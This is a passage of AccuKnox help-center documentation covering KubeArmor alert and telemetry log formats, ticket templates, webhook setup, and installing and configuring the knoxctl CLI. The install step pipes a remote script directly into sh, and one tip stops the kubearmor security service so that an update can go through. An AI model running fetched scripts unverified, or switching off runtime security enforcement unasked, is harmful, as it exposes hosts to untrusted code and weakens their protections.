the node name where the alert got generated aks-agentpool-16128849-vmss000001 HostPID gives the host Process ID 3647533 HostPPID list the details of host Parent Process ID 3642706 Labels shows the pod label from where alert generated app=mysql Message gives the message specified in the policy Alert! Execution of package management process inside container is denied NamespaceName lists the namespace where pod is running wordpress-mysql PID lists the process ID running in container 266 PPID lists the Parent process ID running in container 251 ParentProcessName gives the parent process name from where the operation happend /bin/bash PodName lists the pod name where the alert got generated mysql-76ddc6ddc4-h47hv PolicyName gives the policy that was matched for this alert generation harden-mysql-pkg-mngr-exec ProcessName specifies the operation that happened inside the pod for this alert /usr/bin/apt Resource lists the resources that was requested /usr/bin/apt Result shows whether the event was allowed or denied Permission denied Severity gives the severity level of the operation 5 Source lists the source from where the operation request came /bin/bash Tags specifies the list of benchmarks this policy satisfies NIST,NIST_800-53_CM-7(4),SI-4,process,NIST_800-53_SI-4 Timestamp gives the details of the time this event tried to happen 1687868507 Type shows whether policy matched or default posture alert MatchedPolicy UpdatedTime gives the time of this alert 2023-06-27T12:21:47.932526 cluster_id specifies the cluster id where the alert was generated 596 component_name gives the component which generated this log/alert kubearmor tenant_id specifies the tenant id where this cluster is onboarded in AccuKnox SaaS 11"},{"location":"integrations/telemetry-logs/","title":"Telemetry Logs","text":"<p>AccuKnox CNAPP Solution provides comprehensive visibility of the assets with the help of logs. AccuKnox\u2019s open-source KubeArmor can forward container-related logs to the SaaS. Also, it can forward the container logs that are present in the workloads. We can also use the Feeder service agent to pass the logs to other SIEM tools like Splunk, ELK, Rsyslog, etc.., The information provided by the logs will be useful to understand the attack vector of any attempted attacks.</p>"},{"location":"integrations/telemetry-logs/#sample-container-log","title":"Sample Container Log","text":"<p>Process Log</p> <pre><code>{\n  \"ClusterName\": \"default\",\n  \"HostName\": \"aks-agentpool-16128849-vmss000000\",\n  \"NamespaceName\": \"default\",\n  \"PodName\": \"vault-0\",\n  \"Labels\": \"app.kubernetes.io/instance=vault,app.kubernetes.io/name=vault,component=server,helm.sh/chart=vault-0.24.1,statefulset.kubernetes.io/pod-name=vault-0\",\n  \"ContainerID\": \"775fb27125ee8d9e2f34d6731fbf3bf677a1038f79fe8134856337612007d9ae\",\n  \"ContainerName\": \"vault\",\n  \"ContainerImage\": \"docker.io/hashicorp/vault:1.13.1@sha256:b888abc3fc0529550d4a6c87884419e86b8cb736fe556e3e717a6bc50888b3b8\",\n  \"ParentProcessName\": \"/usr/bin/runc\",\n  \"ProcessName\": \"/bin/sh\",\n  \"HostPPID\": 2514065,\n  \"HostPID\": 2514068,\n  \"PPID\": 2514065,\n  \"PID\": 3552620,\n  \"UID\": 100,\n  \"Type\": \"ContainerLog\",\n  \"Source\": \"/usr/bin/runc\",\n  \"Operation\": \"Process\",\n  \"Resource\": \"/bin/sh -ec vault status -tls-skip-verify\",\n  \"Data\": \"syscall=SYS_EXECVE\",\n  \"Result\": \"Passed\"\n}\n</code></pre> <p>File log</p> <pre><code>{\n  \"ClusterName\": \"default\",\n  \"HostName\": \"aks-agentpool-16128849-vmss000000\",\n  \"NamespaceName\": \"accuknox-agents\",\n  \"PodName\": \"discovery-engine-6f5c4df7b4-q8zbc\",\n  \"Labels\": \"app=discovery-engine\",\n  \"ContainerID\": \"7aca8d52d35ab7872df6a454ca32339386be755d9ed6bd6bf7b37ec6aaf277e4\",\n  \"ContainerName\": \"discovery-engine\",\n  \"ContainerImage\": \"docker.io/accuknox/knoxautopolicy:v0.9@sha256:bb83b5c6d41e0d0aa3b5d6621188c284ea99741c3692e34b0f089b0e74745413\",\n  \"ParentProcessName\": \"/usr/bin/containerd-shim-runc-v2\",\n  \"ProcessName\": \"/knoxAutoPolicy\",\n  \"HostPPID\": 967496,\n  \"HostPID\": 967872,\n  \"PPID\": 967496,\n  \"PID\": 1,\n  \"Type\": \"ContainerLog\",\n  \"Source\": \"/knoxAutoPolicy\",\n  \"Operation\": \"File\",\n  \"Resource\": \"/var/run/secrets/kubernetes.io/serviceaccount/token\",\n  \"Data\": \"syscall=SYS_OPENAT fd=-100 flags=O_RDONLY|O_CLOEXEC\",\n  \"Result\": \"Passed\"\n}\n</code></pre> <p>Network log</p> <pre><code>{\n  \"ClusterName\": \"default\",\n  \"HostName\": \"aks-agentpool-16128849-vmss000001\",\n  \"NamespaceName\": \"accuknox-agents\",\n  \"PodName\": \"policy-enforcement-agent-7946b64dfb-f4lgv\",\n  \"Labels\": \"app=policy-enforcement-agent\",\n  \"ContainerID\": \"b597629c9b59304c779c51839e9a590fa96871bdfdf55bfec73b26c9fb7647d7\",\n  \"ContainerName\": \"policy-enforcement-agent\",\n  \"ContainerImage\": \"public.ecr.aws/k9v9d5v2/policy-enforcement-agent:v0.1.0@sha256:005c1fde3ff8a667f3ac7540c5c011c752a7e3aaa2c89aa335703289ed8d80f8\",\n  \"ParentProcessName\": \"/usr/bin/containerd-shim-runc-v2\",\n  \"ProcessName\": \"/home/pea/main\",\n  \"HostPPID\": 1394403,\n  \"HostPID\": 1394554,\n  \"PPID\": 1394403,\n  \"PID\": 1,\n  \"Type\": \"ContainerLog\",\n  \"Source\": \"./main\",\n  \"Operation\": \"Network\",\n  \"Resource\": \"sa_family=AF_INET sin_port=53 sin_addr=10.0.0.10\",\n  \"Data\": \"syscall=SYS_CONNECT fd=10\",\n  \"Result\": \"Passed\"\n}\n</code></pre>"},{"location":"integrations/telemetry-logs/#logs-format","title":"Logs Format","text":"Log field Description Example ClusterName gives information about the cluster for which the log was generated default Operation gives details about what type of operation happened in the pod File/Process/ Network ContainerID information about the container ID from where log was generated 7aca8d52d35ab7872df6a454ca32339386be ContainerImage shows the image that was used to spin up the container docker.io/accuknox/knoxautopolicy:v0.9@sha256:bb83b5c6d41e0d0aa3b5d6621188c284ea ContainerName specifies the Container name where the log got generated discovery-engine Data shows the system call that was invoked for this operation syscall=SYS_OPENAT fd=-100 flags=O_RDWR|O_CREAT|O_NOFOLLOW|O_CLOEXEC HostName shows the node name where the log got generated aks-agentpool-16128849-vmss000001 HostPID gives the host Process ID 967872 HostPPID list the details of host Parent Process ID 967496 Labels shows the pod label from where log generated app=discovery-engine Message gives the message specified in the policy Alert! Execution of package management process inside container is denied NamespaceName lists the namespace where pod is running accuknox-agents PID lists the process ID running in container 1 PPID lists the Parent process ID running in container 967496 ParentProcessName gives the parent process name from where the operation happend /usr/bin/containerd-shim-runc-v2 PodName lists the pod name where the log got generated mysql-76ddc6ddc4-h47hv ProcessName specifies the operation that happened inside the pod for this log /knoxAutoPolicy Resource lists the resources that was requested //accuknox-obs.db Result shows whether the event was allowed or denied Passed Source lists the source from where the operation request came /knoxAutoPolicy Type specifies it as container log ContainerLog"},{"location":"integrations/ticket-template/","title":"Ticket Template System","text":"<p>A ticket template is a predefined structure used for creating tickets, typically integrated with third-party platforms. It serves as a standardized format for logging, tracking, and resolving issues, enabling teams to maintain consistency and efficiency in issue management.</p> <p>You can leverage the default template or create custom templates based on specific requirements, such as findings, controls, data lists, or checks. This flexibility allows teams to address a variety of scenarios while maintaining structured and organized ticket management.</p> <p>The ticket template system offers both dynamic and static templates, allowing for efficient ticket creation across different data types. Whether the ticket pertains to Findings, Controls, Data Lists, or Checks, the system enables users to generate precise ticket titles, dynamic descriptions, and consistent static information across multiple objects or groups.</p>"},{"location":"integrations/ticket-template/#managing-ticket-templates-view-edit-or-create","title":"Managing Ticket Templates: View, Edit, or Create","text":"<ul> <li> <p>Go to Settings. Click Ticket Template.     </p> </li> <li> <p>Viewing a Template:    Click the desired ticket template from the list to view its details.</p> </li> <li> <p>Editing a Template:    Click on the ticket template to open its details. You can make edits directly from this screen.        </p> </li> <li> <p>Deleting a Template:    Select the template you wish to remove, then click Delete.     </p> </li> <li> <p>Duplicating a Template:    To create a copy of an existing template, select the template and click Duplicate Template.     </p> </li> <li> <p>Creating a Custom Template:</p> <ul> <li>Click on Add Template to create a new custom template.</li> <li>Fill in the required fields and save your changes. </li> </ul> </li> </ul>"},{"location":"integrations/ticket-template/#template-fields","title":"Template Fields","text":"<ul> <li> <p>Name:    This field specifies the name of the ticket or the item being referenced. It is critical to identify the issue at a glance.    Example: \"High-Risk Vulnerability\"</p> </li> <li> <p>Data Type:    Defines the type of data the ticket will address. The options include: Finding, Control, Data List, Check</p> </li> <li> <p>Title Template:    This field is used to generate the ticket title in the ticketing system by inserting specific variables into a pre-defined format. After filling in the relevant variables with actual data, the title will provide clear identification of the issue being logged.    Example Template: <code>Vulnerability-Container-{asset}</code>    If the asset is \"Web Server,\" the resulting title will be: <code>Vulnerability-Container-Web Server</code></p> </li> <li> <p>Dynamic Template:    The dynamic template is useful when the selected vulnerability or control affects multiple objects in a group. In this case, the template will loop through each object and dynamically generate the description for each one, combining all relevant data.    Dynamic Template Example: <code>| { asset } | { location } | { vulnerability.name } | { vulnerability.description } | { vulnerability.solution } |</code></p> <p>If you have three objects (assets), this template will dynamically generate a separate row for each object in the group:</p> <p>Example:</p> <pre><code>- Asset: Web Server | Location: US-East | Name: SQL Injection | Description: SQLi vulnerability | Solution: Patch DB layer\n\n- Asset: DB Server | Location: US-West | Name: XSS | Description: Cross-site scripting | Solution: Apply filter\n</code></pre> </li> <li> <p>Static Template:     Static templates are used when you have multiple objects sharing the same finding or issue. This template ensures that consistent information- such as the solution or description- applies across all grouped objects. Only the dynamic template will adjust for variations.     Static Template Example:<code>| Asset | Library | Finding | Description | Solution |{ dynamic_template }</code></p> <p>In this case, the same solution and description can be applied across multiple assets. The dynamic template can then fill in asset-specific information like asset names or library versions.</p> </li> </ul>"},{"location":"integrations/ticket-template/#guide-to-retrieving-fields-for-ticket-templates","title":"Guide to Retrieving Fields for Ticket Templates","text":"<p>In security scanning workflows, various tools are used to detect vulnerabilities, compliance violations, misconfigurations, and infrastructure issues. Each of these tools produces reports containing specific fields such as the name, description, location, and remediation steps for the identified issues. These fields need to be correctly extracted and placed into ticket templates for further action.</p>"},{"location":"integrations/ticket-template/#steps-to-extract-the-field-for-more-information","title":"Steps to extract the field for more information","text":"<ul> <li>Right-click and Inspect: Right-click and choose Inspect to open the Developer Tools </li> <li>Go to the Network Tab: In the Developer Tools, click on the Network tab. This tab records all network requests made by the web page, including data fetched from the server.</li> <li>Extract the Data: In the Response section of the selected request, you should see the data. You can use this information to identify the fields you need. </li> </ul> <p>Here are some examples</p>"},{"location":"integrations/ticket-template/#a-vulnerability-scan-data","title":"A. Vulnerability Scan Data","text":"<p>Vulnerability scans detect asset security flaws (e.g., servers, applications, containers). The following fields should be retrieved from a vulnerability scan report:</p> Field Data Type Description Vulnerability Name String The title or name of the identified vulnerability (e.g., CVE-1234). Vulnerability Description String A detailed description of the vulnerability, including its impact. Solution String The suggested remediation or mitigation strategy to fix the vulnerability. Location String The location or asset impacted by the vulnerability (e.g., IP address, hostname, image layer). Miscellaneous (Synopsis) String A brief summary or synopsis of the vulnerability. Tool Output Raw Data Output from the scanning tool, often including severity, detection method, and any associated evidence. Risk Factor/Severity Enum (Low/Medium/High) The risk level or severity of the vulnerability as assigned by the scanning tool."},{"location":"integrations/ticket-template/#b-compliance-data","title":"B. Compliance Data","text":"<p>Compliance scans assess the adherence of systems to established security controls (e.g., CIS Benchmarks, NIST, ISO). The following fields should be retrieved from a compliance scan report:</p> Field Data Type Description Control ID String Unique identifier for the compliance control (e.g., CIS 1.1). Control Description String Detailed description of the compliance control or rule. Tags Array of Strings Tags or categories associated with the control (e.g., \"Network Security\", \"IAM\"). Expected Result String Expected outcome for passing compliance (e.g., \"Ensure logging is enabled\"). Comments String Any additional notes or comments regarding the control."},{"location":"integrations/ticket-template/#c-registry-and-cloud-misconfiguration-data","title":"C. Registry and Cloud Misconfiguration Data","text":"<p>Registry scans (for container images) and cloud misconfiguration scans (for cloud services) identify issues such as insecure configurations or vulnerable image layers. The following fields should be retrieved:</p> Field Data Type Description Asset Name String Name of the affected asset (e.g., container image or cloud resource). Location String Location of the misconfiguration (e.g., image layer, cloud service, region). Vulnerability Name String Name or title of the issue (e.g., \"Insecure S3 Bucket\"). Description String Detailed description of the misconfiguration or vulnerability. Solution String Recommended steps to remediate or mitigate the misconfiguration."},{"location":"integrations/ticket-template/#ticket-creation-and-population","title":"Ticket Creation and Population","text":"<p>Once the fields are extracted, follow these steps to populate the ticket template:</p> <ul> <li>Open the Template: Select the appropriate template for the type of scan (e.g., vulnerability, compliance, cloud).</li> <li>Insert Extracted Data: For each placeholder in the template, insert the corresponding data extracted from the scan report.</li> <li>Submit Ticket: Once the template is fully populated, submit the ticket into your issue tracking system (e.g., Jira, Slack).</li> </ul>"},{"location":"integrations/webhook-integration/","title":"Webhook Integration Guide","text":"<p>Webhooks let you automatically send real-time alerts from AccuKnox to your external systems. This is useful for integrating with ticketing tools, chat apps, SIEMs, or custom workflows\u2014so you can automate responses or notifications when security events occur.</p> <p>Common use cases:</p> <ul> <li>Forwarding alerts to Slack, Microsoft Teams, or email</li> <li>Triggering incident tickets in Jira or ServiceNow</li> <li>Sending events to SIEM or SOAR platforms</li> </ul> <p>This guide walks you through:</p> <ul> <li>Setting up a webhook in the AccuKnox platform</li> <li>Understanding how event data is passed via the webhook</li> </ul>"},{"location":"integrations/webhook-integration/#configuring-a-webhook","title":"Configuring a Webhook","text":""},{"location":"integrations/webhook-integration/#step-1-open-webhook-integration","title":"Step 1: Open Webhook Integration","text":"<ol> <li>Go to Settings \u2192 Integration</li> <li>Under the CWPP tab, scroll to Notification</li> <li>Click Integrate Now next to the Webhook option</li> </ol>"},{"location":"integrations/webhook-integration/#step-2-fill-in-webhook-details","title":"Step 2: Fill in Webhook Details","text":"Field Description Integration Name A label for your integration Method Choose <code>POST</code>, <code>PUT</code>, or <code>GET</code> Webhook URL Target URL (e.g., GitHub or webhook.site) Success Codes Expected HTTP codes (e.g., <code>200</code>, <code>204</code>, <code>422</code>) Test Payload Optional sample data Description Optional note Headers Add necessary headers (e.g., <code>Authorization</code>) <p>Click Test Connection. Once successful, click Connect to activate.</p> <p></p>"},{"location":"integrations/webhook-integration/#triggering-alerts-via-webhook","title":"Triggering Alerts via Webhook","text":""},{"location":"integrations/webhook-integration/#step-1-create-a-trigger","title":"Step 1: Create a Trigger","text":"<ol> <li>Go to Alerts \u2192 All Alerts</li> <li>Filter by alert type (e.g., Action = Block)</li> <li>Click Create Trigger</li> <li>Set a name and assign your webhook as the Notification Channel</li> <li>Click Test Filter, then save</li> </ol>"},{"location":"integrations/webhook-integration/#step-2-simulate-a-policy-violation","title":"Step 2: Simulate a Policy Violation","text":"<ul> <li>Apply a runtime policy (e.g., file integrity block)</li> <li>Trigger a violation via CLI or app</li> <li>The alert will activate and send data via the webhook</li> </ul>"},{"location":"integrations/webhook-integration/#viewing-webhook-data","title":"Viewing Webhook Data","text":"<p>Use webhook.site to view:</p> <ul> <li>Request Method (e.g., POST)</li> <li>Headers (auth, content-type, etc.)</li> <li>Payload (full JSON of the alert)</li> </ul> <p></p> <p>Example payload:</p> <pre><code>{\n  \"Action\": \"Block\",\n  \"Message\": \"Detected and prevented compromise to File integrity\",\n  \"PolicyName\": \"harden-file-integrity-monitoring\",\n  \"ProcessName\": \"/bin/touch\",\n  \"Tags\": \"MITRE_T1036,MITRE_T1565\"\n}\n</code></pre> <p>You will get the raw log data, which is what you see in the alerts section of AccuKnox via this webhook integration. This allows you to capture all relevant details about the alert, including the action taken, message, policy name, process name, and associated tags.</p> <p></p>"},{"location":"integrations/webhook-integration/#managing-webhooks","title":"Managing Webhooks","text":""},{"location":"integrations/webhook-integration/#view-test","title":"View &amp; Test","text":"<ul> <li>Go to Settings \u2192 Integration</li> <li>Use filter to view webhook entries</li> <li>Click Start Testing to verify</li> </ul>"},{"location":"integrations/webhook-integration/#edit-webhook","title":"Edit Webhook","text":"<ul> <li>Click integration name, update fields</li> <li>Re-test connection, then Save</li> </ul>"},{"location":"integrations/webhook-integration/#delete-webhook","title":"Delete Webhook","text":"<ul> <li>Open integration and click Delete Channel</li> <li>Confirm to remove it from the list</li> </ul>"},{"location":"integrations/webhook-integration/#troubleshooting","title":"Troubleshooting","text":"<ul> <li>Confirm alert filters are correctly set</li> <li>Check for valid webhook URL and response codes</li> <li>Ensure headers (like Authorization) are included</li> <li>For GitHub, use:</li> </ul> <pre><code>https://api.github.com/repos/&lt;org&gt;/&lt;repo&gt;/dispatches\n</code></pre> <p>with <code>POST</code> method and <code>Authorization: token &lt;token&gt;</code></p> <ul> <li>Use https://webhook.site to test and debug incoming webhook data</li> </ul>"},{"location":"introduction/home/","title":"None","text":"Welcome to AccuKnox Help Center Enterprise CNAPP Suite Agentless DevSecOps (ASPM) <p>Embeds security practices into DevOps, automating security testing and compliance throughout the SDLC from build to runtime environments.</p> LEARN MORE  Agentless Cloud Security (CSPM) <p>Identifies cloud misconfigurations, ensures compliance, and continuously monitors security across clouds.</p> LEARN MORE  Read Blog Runtime Protection (CWPP) <p>Provides security for cloud workloads by detecting threats, vulnerabilities, and misconfigurations in real-time.</p> LEARN MORE  Agentless On-Prem Deployment <p>Secure air-gapped deployment with our CNAPP security suite to achieve federal regulatory standards. </p> LEARN MORE  See Features AI/ML Security <p>The AI-SPM tool identifies cloud misconfigurations with continuous monitoring and real-time intelligence for AI/ML models.</p> LEARN MORE  See Features Cloud Detection &amp; Response (CDR) <p>Detect &amp; Remediate Threats on AWS, GCP, Azure and catch what matters with AccuKnox.</p> LEARN MORE  K8s Identity &amp; Entitlements Management (KIEM) <p>Enforces IAM controls and entitlements across K8s clusters for secure authorization and to prevent privilege escalation.</p> LEARN MORE  Agentless Continuous Compliance <p>Provides a unified view of security posture, risk analysis, and compliance across multi-cloud and K8s environments.</p> LEARN MORE  See Features Kubernetes Security Posture Management (KSPM) <p>Continuously monitors K8s clusters to identify and remediate misconfigurations, vulnerabilities in real-time.</p> LEARN MORE  Popular Use-Cases <p>DevSecOps (ASPM)</p> <ul> <li>IaC Scan AWS S3 Buckets (CI/CD Pipeline)</li> <li>SAST + SQL Injection</li> <li>ASPM Container Scan</li> <li>EPSS Scoring</li> </ul> <p>Container Security (CWPP)</p> <ul> <li>Container Image Scan</li> <li>Runtime Application Hardening</li> <li>Workload Hardening</li> </ul> <p>Securing Secrets Manager (CWPP)</p> <ul> <li>HarshiCorp Vault Hardening</li> <li>CyberArk Conjur Hardening</li> </ul> <p>Least Permissive Posture Assessment (CWPP)</p> <ul> <li>Runtime Application Behaviour Discovery</li> <li>Audit/Forensics</li> <li>Zero trust Security</li> </ul> <p>Host Security (CWPP)</p> <ul> <li>Host Scan</li> <li>Malware Scan</li> <li>VM Hardening</li> </ul> <p>Cloud Security (CSPM)</p> <ul> <li>Asset Inventory</li> <li>Cloud Misconfiguration and Drift Detection</li> </ul> <p>Automation</p> <ul> <li>Ticketing</li> <li>Rules Engine</li> </ul> <p>Cloud Detection &amp; Response (CDR)</p> <ul> <li>Onboarding AWS for CDR</li> <li>Onboarding Azure for CDR</li> <li>Onboarding GCP for CDR</li> <li>Alert Remediation</li> </ul> <p>AI/ML Security</p> <ul> <li>Jupyter Notebook Security</li> <li>LLM Security Onboarding</li> <li>ModelArmor (Open Source)</li> </ul> VIEW ALL USE CASES  Integrate Seamlessly In Your Technology Ecosystem <p>Check out integrations for Azure, Google Cloud Build, AWS, Jenkins, Gitlab, CheckMarkx and more. We also support Container Platforms like Nutanix, Rafay and Mirantis and Notification platforms like Slack. AccuKnox integrates with major SIEM and security event tools, including Splunk, AWS CloudWatch, Azure Sentinel, and leading ticketing systems like Jira, ServiceNow, and Freshservice.</p> GET STARTED  Technical Support <p>Empower your security team with the product knowledge they need to maximize the value of your solution.</p> Raise Ticket <p>Contact our Support Team to quickly resolve any issues.</p> CONNECT WITH US \u2192 AccuKnox Certifications <p>AccuKnox certifications ensure compliance with industry security standards.</p> GET CERTIFIED \u2192 Resources <p>Download and make the most of AccuKnox guides and manuals.</p> DOWNLOAD NOW \u2192 Find Out More RESOURCES SUPPORT MATRIX LATEST RELEASE NOTES FAQ"},{"location":"introduction/open-source-vs-enterprise/","title":"Open Source vs Enterprise","text":""},{"location":"introduction/open-source-vs-enterprise/#kubearmor-opensource","title":"KubeArmor (Opensource)","text":"<p>KubeArmor is a cloud-native runtime security enforcement system that restricts the behavior (such as process execution, file access, and networking operations) of pods, containers, and nodes (VMs) at the system level.</p>"},{"location":"introduction/open-source-vs-enterprise/#accuknox-enterprise","title":"AccuKnox (Enterprise)","text":"<p>AccuKnox is one of the industry\u2019s most comprehensive and integrated CNAPP solutions which brings together multiple disparate security modules to deliver comprehensive Zero Trust security for Networks, Applications (K8s, VM), and Data across Cloud.</p> Features Open Source Enterprise Observability into the workload at granular level In-line remediation for Zero Day Attacks Manual apply of Security Policies using CLI Integration to SIEM for security events and Notification tool Network security using CNI Auto-Discovered Behavioural Policies Recommendation of Hardening Policies based on standard compliance framework - MITRE, NIST, PCI-DSS, CIS Inventory View of Application Network Graph View of the Application Network Microsegmentation in the application Hardening of the Secrets Managers like Hashicorp Vault, CyberArk Conjur GitOps based Version Control for Policy Lifecycle Management Rollback of recently changed Policy governing App Behavior On-the-fly detection of change in App Behavior through Policies Multi-Tenant, Multi-Cluster, RBAC for user-management Comprehensive Dashboard across workloads running in Managed/Unmanaged Cluster, Containerized environment, VM or Baremetal Integration with Registries for Container Image Vuln Scan Telemetry aggregation (Process executed, File accessed, Network connections made) and Alerts events (Audit, Block) <p></p> <p>SCHEDULE DEMO</p>"},{"location":"knoxctl/","title":"Overview","text":"Docs <p>       knoxctl is a command-line tool designed to help AccuKnox customers securely and efficiently access the AccuKnox platform. It leverages the platform\u2019s APIs to provide full access to CNAPP features directly from the terminal for streamlined automation and management.     </p> \ud83d\udee1\ufe0f Install Knoxctl <code>     curl -sfL https://knoxctl.accuknox.com/install.sh | sh -   </code>      Copy    <p>To install <code>knoxctl</code>, download the appropriate binary for your Unix-based system. Use <code>uname -a</code> in the terminal to check your OS type and architecture, and select the matching version.</p> <p>Latest version is <code>0.9.0</code>, released on 7<sup>th</sup> July 2025.</p> <ul> <li>knoxctl for Linux (AMD64/x86_64)</li> <li>knoxctl for Linux (ARM64)</li> <li>knoxctl for Mac (Intel)</li> <li>knoxctl for Mac (Apple Silicon)</li> </ul> <p>Info</p> <p>In case knoxctl update failed due to KubeArmor Policy, please run the following command before trying to upgrade</p> <pre><code>sudo systemctl stop kubearmor.service\n</code></pre>  In case you run into any issues, please email support@accuknox.com. For more details, visit accuknox.com and help.accuknox.com."},{"location":"knoxctl/image-scan/","title":"Container Image Scanner","text":"<p>AccuKnox offers a container image scanning solution designed to periodically inspect container images running on your machine.</p>"},{"location":"knoxctl/image-scan/#installation-guide","title":"\ud83d\udee0 Installation Guide","text":"<p>Follow these steps to deploy the container image scanner:</p>"},{"location":"knoxctl/image-scan/#1-create-a-label","title":"1. Create a Label","text":"<p>In the AccuKnox Control Plane, create a unique Label. This will be associated with the container image scan reports.</p>"},{"location":"knoxctl/image-scan/#2-generate-a-token","title":"2. Generate a Token","text":"<p>From the AccuKnox Control Plane:</p> <ul> <li>Generate an Artifact Token</li> <li>Note down both the Token and your Tenant ID</li> </ul>"},{"location":"knoxctl/image-scan/#3-scan-your-machine","title":"3. Scan your machine","text":"<p>Use the following command to scan your machine:</p> <pre><code>knoxctl image-scan --artifactEndpoint=\"&lt;url&gt;\" \\\n    --token=\"&lt;authToken&gt;\" \\\n    --label=\"&lt;label&gt;\" \\\n</code></pre> <p>Replace the parameters (<code>&lt;authToken&gt;</code>, <code>&lt;url&gt;</code> and <code>&lt;label&gt;</code>) with the appropriate values.</p> <p>if you want to scan the machine on a regular basis you can configure the scan to be run by systemd timers by running the following script.</p> <p>Before running the script you need to replace the parameters (<code>&lt;authToken&gt;</code>, <code>&lt;url&gt;</code> and <code>&lt;label&gt;</code>) with their appropriate values.</p> <pre><code>#!/bin/bash\n\nexport AK_BASE_URL=\"&lt;url&gt;\"\nexport AK_TOKEN=\"&lt;authToken&gt;\"\nexport AK_LABEL=\"&lt;label&gt;\"\n\nexport AK_URL=\"$AK_BASE_URL/api/v1/artifact/\"\n\ncat &lt;&lt;EOF | sudo tee /etc/systemd/system/accuknox-container-scan.service\n# This service unit is for container image scanning\n# By AccuKnox Inc\n#\n\n[Unit]\nDescription=Scan running container images and post results to AccuKnox SaaS\nWants=accuknox-container-scan.timer\n\n[Service]\nType=oneshot\nExecStart=/bin/knoxctl image-scan --artifactEndpoint=\"$AK_URL\" --token=\"$AK_TOKEN\" --label=\"$AK_LABEL\"\nMemoryHigh=1800M\nMemoryMax=2G\nKillMode=control-group\nCPUQuota=50%\n\n[Install]\nWantedBy=multi-user.target\nEOF\n\ncat &lt;&lt;EOF | sudo tee /etc/systemd/system/accuknox-container-scan.timer\n# This service unit is for container image scanning\n# By AccuKnox Inc\n#\n\n[Unit]\nDescription=Scan running container images and post results to AccuKnox SaaS\nRequires=accuknox-container-scan.service\n\n[Timer]\nUnit=accuknox-container-scan.service\nOnCalendar=daily\nPersistent=true\n\n[Install]\nWantedBy=timers.target\nEOF\n\nsystemctl daemon-reload\nsystemctl enable --now accuknox-container-scan.timer\n</code></pre> <p>The above will run the scan daily at midnight, you can change the execution time by modifying the value of <code>OnCalendar</code> in the systemd timer configuration.</p>"},{"location":"knoxctl/image-scan/#parameters","title":"\u2699\ufe0f Parameters:","text":"Variable Sample Value Description authToken eyJhbGc... AccuKnox Token url cspm.accuknox.com AccuKnox CSPM API Endpoint label kubeshield AccuKnox Label"},{"location":"knoxctl/image-scan/#post-installation","title":"\u2705 Post-Installation","text":"<p>Once the scan is completed, results will be visible in the Findings or Registry Scan sections within the AccuKnox Control Plane.</p> <ul> <li>Navigate to Issues -&gt; Findings</li> <li>Switch to Findings tab</li> <li>Select Container Image Findings &amp; do Group by based on Label Name</li> <li>You should be able to see the data for the Label used in above command</li> </ul>"},{"location":"knoxctl/image-scan/#check-services-in-a-vm","title":"Check Services in a VM","text":"<ul> <li>See if a service is running:</li> </ul> <pre><code>sudo systemctl status &lt;service_name&gt; # e.g., kubearmor, vm-adapter\n\nsudo systemctl status kubearmor\nsudo systemctl status vm-adapter\n</code></pre> <ul> <li>List all running services:</li> </ul> <pre><code>systemctl --type=service --state=running\n</code></pre>"},{"location":"knoxctl/knoxctl-commands/","title":"\ud83d\udcd8 Knoxctl CLI Usage Cheatsheet","text":"<p>This document provides a quick reference guide for common <code>knoxctl</code> CLI operations. These commands help you interact with AccuKnox-managed Kubernetes clusters, nodes, and alerts. Use them to efficiently filter, inspect, and debug workloads across your cloud environments.</p> <p>\u2705 Tip: Use the <code>--json</code> flag to get machine-readable output and integrate with other tools.</p>"},{"location":"knoxctl/knoxctl-commands/#cluster-and-node-operations","title":"\ud83d\udd0d Cluster and Node Operations","text":"Use Case Command List all clusters with <code>\"substring\"</code> in name and list their nodes <code>knoxctl api cluster list --clusterjq '.[] \\| select(.ClusterName\\|test(\"substring\"))' --nodes</code> List all nodes in cluster named <code>\"nrs\"</code> <code>knoxctl api cluster list --clusterjq '.[] \\| select(.ClusterName == \"nrs\")' --nodes</code> Show node <code>\"store03460\"</code> in cluster <code>\"nrs\"</code> <code>knoxctl api cluster list --clusterjq '.[] \\| select(.ClusterName == \"nrs\")' --nodes --nodejq '.result[] \\| select(.NodeName == \"store03460\")'</code> Use page size of 100 for output <code>--page-size 100</code> Output results in JSON format <code>--json</code>"},{"location":"knoxctl/knoxctl-commands/#alerts-and-violations","title":"\ud83d\udea8 Alerts and Violations","text":"Use Case Command List alerts received in last 5 minutes on cluster <code>\"nrs\"</code> <code>knoxctl api cluster alerts --clusterjq '.[] \\| select(.ClusterName == \"nrs\")' --stime $(date --date='5 minutes ago' +%s) --json</code> Identify unique policy violations / alert messages in last 5 minutes <code>knoxctl api cluster alerts --clusterjq '.[] \\| select(.ClusterName == \"nrs\")' --stime $(date --date='5 minutes ago' +%s) --alertjq '.response[] \\| \"\\( .Message )\"' --json \\| jq -r '.[]' \\| sort \\| uniq -c</code> Get alerts from node <code>\"store04281\"</code> in last 15 minutes <code>knoxctl api cluster alerts --filters '{\"field\":\"HostName\",\"value\":\"store04281\",\"op\":\"match\"}' --stime $(date --date='15 minutes ago' +%s)</code> Match substring <code>\"idtrs\"</code> in <code>Resource</code> field of alerts (last 15 mins) <code>knoxctl api cluster alerts --alertjq '.response[] \\| select(.Resource // \"unknown\" \\| test(\"idtrs\"))' --stime $(date --date='15 minutes ago' +%s)</code> <p>Info</p> <p>For more help and examples, visit the official documentation at help.accuknox.com.</p>"},{"location":"knoxctl/knoxctl-config/","title":"Knoxctl Configuration Setup","text":""},{"location":"knoxctl/knoxctl-config/#step-1-create-an-access-key","title":"Step 1: Create an Access Key","text":"<ol> <li>Log in to AccuKnox Control Plane.</li> <li>Go to Settings \u2192 User-Management.</li> <li>Click the three-dot menu next to your username.</li> <li>Select Get Access Key.</li> <li>Fill in name, role (preferably Viewer), and expiry. Click Generate.</li> <li>Copy the Token and Tenant ID.</li> </ol>"},{"location":"knoxctl/knoxctl-config/#step-2-create-accuknoxcfg-file","title":"Step 2: Create <code>.accuknox.cfg</code> File","text":"<p>Create the config file at this location:</p> <pre><code>$HOME/.accuknox.cfg\n</code></pre> <p>With the following content:</p> <pre><code>[default]\naccess_token = &lt;YOUR_ACCESS_TOKEN&gt;\ntenant_id = &lt;YOUR_TENANT_ID&gt;\n</code></pre> <p>Replace <code>&lt;YOUR_ACCESS_TOKEN&gt;</code> and <code>&lt;YOUR_TENANT_ID&gt;</code> with the values you copied.</p> <p>You're done!\u2705</p> <p>Your AccuKnox CLI configuration is now set up.</p> <p>You can verify it by running:</p> <pre><code>knoxctl api cluster list\n</code></pre> <p>If everything is configured correctly, you should see a list of your clusters. <code>knoxctl</code> will now use this config automatically for CLI 